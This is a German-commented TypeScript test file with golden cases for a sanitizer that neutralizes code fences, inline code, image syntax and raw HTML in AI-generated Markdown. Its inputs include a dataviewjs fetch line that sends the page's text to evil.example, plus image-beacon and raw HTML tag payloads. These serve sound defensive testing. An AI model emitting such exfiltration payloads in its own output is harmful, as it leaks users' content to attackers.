// Golden-Tests für neutralizeModelMarkdown — die Fälle sind eine benannte Liste, damit sie mit dem Modul ins Kit wandern
// können (Kit-Modul `safe-markdown`). Jeder Fall prüft die Sicherheitseigenschaften UND die genaue Ausgabe.
import { describe, expect, it } from "vitest";
import { neutralizeModelMarkdown } from "../src/core/chat-markdown";

const B = "`".repeat(3);
const T = "~".repeat(3);
const G = "\u02CB"; // ˋ
const GG = G.repeat(3);
const W = "\u02DC".repeat(3); // ˜˜˜

/** Sicherheitseigenschaften der Ausgabe; liefert die Verstöße. */
function violations(out: string): string[] {
  const v: string[] = [];
  if (out.includes("`")) v.push("backtick");
  if (/~{3,}/.test(out)) v.push("tilde run");
  if (out.includes("![")) v.push("image syntax");
  if (out.includes("<")) v.push("raw <");
  return v;
}

/** [Name, Eingabe, erwartete Ausgabe] */
const GOLDEN: Array<[string, string, string]> = [
  ["Tag (dataviewjs)", `${B}dataviewjs\nfetch('https://evil.example/?q='+document.body.innerText)\n${B}`, `${GG}dataviewjs\nfetch('https://evil.example/?q='+document.body.innerText)\n${GG}`],
  ["Leerzeichen vor Tag", `${B} dataviewjs\nx\n${B}`, `${GG} dataviewjs\nx\n${GG}`],
  ["Fence mit 5 Backticks", "`````dataviewjs\nx\n`````", `${G.repeat(5)}dataviewjs\nx\n${G.repeat(5)}`],
  ["verschachtelte Zäune (4 Backticks um 3)", `${B}\`md\n${B}dataviewjs\nx\n${B}\n${B}\``, `${G.repeat(4)}md\n${GG}dataviewjs\nx\n${GG}\n${G.repeat(4)}`],
  ["eingerückt (2 Leerzeichen)", `  ${B}dataviewjs\n  x\n  ${B}`, `  ${GG}dataviewjs\n  x\n  ${GG}`],
  ["eingerückt (5 Leerzeichen, bleibt Einrückungsblock)", `     ${B}dataviewjs\n     x`, `     ${GG}dataviewjs\n     x`],
  ["in Zitat/Callout", `> [!note]\n> ${B}dataviewjs\n> x\n> ${B}`, `> [!note]\n> ${GG}dataviewjs\n> x\n> ${GG}`],
  ["in Listenpunkt", `- ${B}dataviewjs\n  x\n  ${B}`, `- ${GG}dataviewjs\n  x\n  ${GG}`],
  ["Fence ohne Schluss", `${B}dataviewjs\nx`, `${GG}dataviewjs\nx`],
  ["Info-String mit Sonderzeichen", `${B}js {title="x"}\nx\n${B}`, `${GG}js {title="x"}\nx\n${GG}`],
  ["CR-only-Zeilenenden", `a\r${B}dataviewjs\rx\r${B}`, `a\r${GG}dataviewjs\rx\r${GG}`],
  ["CRLF-Zeilenenden", `a\r\n${B}dataviewjs\r\nx\r\n${B}`, `a\r\n${GG}dataviewjs\r\nx\r\n${GG}`],
  ["Tilde-Fence", `${T}dataviewjs\nx\n${T}`, `${W}dataviewjs\nx\n${W}`],
  ["Tilde-Fence Einzug 3", `   ${T}dataviewjs\nx\n   ${T}`, `   ${W}dataviewjs\nx\n   ${W}`],
  ["Tilde-Fence Einzug 5", `     ${T}dataviewjs\nx`, `     ${W}dataviewjs\nx`],
  ["Tilde-Fence nach CR", `a\r~~~~dataviewjs\rx`, `a\r${"\u02DC".repeat(4)}dataviewjs\rx`],
  ["Tilde-Fence in Zitat", `> ${T}dataviewjs\n> x`, `> ${W}dataviewjs\n> x`],
  ["Durchstreichen bleibt", "~~alt~~ neu", "~~alt~~ neu"],
  ["Inline $=", "see `$= dv.pages().length` here", `see ${G}$= dv.pages().length${G} here`],
  ["Inline =", "name: `= this.file.name`", `name: ${G}= this.file.name${G}`],
  ["Inline mit führendem Leerzeichen", "` $= dv.pages()`", `${G} $= dv.pages()${G}`],
  ["Doppel-Backtick-Span", "``$= dv.pages()``", `${G}${G}$= dv.pages()${G}${G}`],
  ["mehrzeiliger Span", "`$= dv\n.pages()\n.length`", `${G}$= dv\n.pages()\n.length${G}`],
  ["harmloser Inline-Code verliert nur die Formatierung", "set `maxRounds` to 20", `set ${G}maxRounds${G} to 20`],
  ["Bild-Syntax", "a ![pic](https://evil.example/?q=1) b", "a pic (https://evil.example/?q=1) b"],
  ["Wikilink-Embed", "see ![[secret.png]]", "see \\[\\[secret.png\\]\\]"],
  ["Referenz-Bild", "![alt][r]\n\n[r]: https://evil.example/x", "[alt]\n\n[r]: https://evil.example/x"],
  ["rohes HTML", 'x <img src="https://evil.example"> y', 'x &lt;img src="https://evil.example"> y'],
  ["Templater-Tag", "<% tp.file.title %>", "&lt;% tp.file.title %>"],
  ["Link bleibt", "[t](https://ok.example)", "[t](https://ok.example)"],
  ["Einrückungsblock (4 Leerzeichen) bleibt", "text\n\n    code line", "text\n\n    code line"],
];

describe("neutralizeModelMarkdown — Golden", () => {
  it.each(GOLDEN)("%s: sicher", (_n, input) => {
    expect(violations(neutralizeModelMarkdown(input))).toEqual([]);
  });
  it.each(GOLDEN)("%s: genaue Ausgabe", (_n, input, expected) => {
    expect(neutralizeModelMarkdown(input)).toBe(expected);
  });
});

describe("neutralizeModelMarkdown — Eigenschaften", () => {
  it("rohes HTML wird für jeden aktiven Tag escaped", () => {
    for (const tag of ["img", "iframe", "script", "video", "audio", "embed", "object", "link", "style", "svg", "div"]) {
      const out = neutralizeModelMarkdown(`x <${tag} src="https://evil.example"> y`);
      expect(out).not.toContain("<");
      expect(out).toContain(`&lt;${tag}`);
    }
  });
  it("Bildsyntax verschwindet auch in (früheren) Codeblöcken", () => {
    const IMG = "![a](https://evil.example/?q=1)";
    for (const text of [`${B}\n${IMG}\n${B}`, `${T}\n${IMG}\n${T}`, `${B}\nx\n${IMG}`, `${B}\n![[x.png]] <img src=y>\n${B}`]) {
      expect(violations(neutralizeModelMarkdown(text))).toEqual([]);
    }
  });
  it("ist idempotent", () => {
    for (const [, input] of GOLDEN) {
      const once = neutralizeModelMarkdown(input);
      expect(neutralizeModelMarkdown(once)).toBe(once);
    }
  });
});
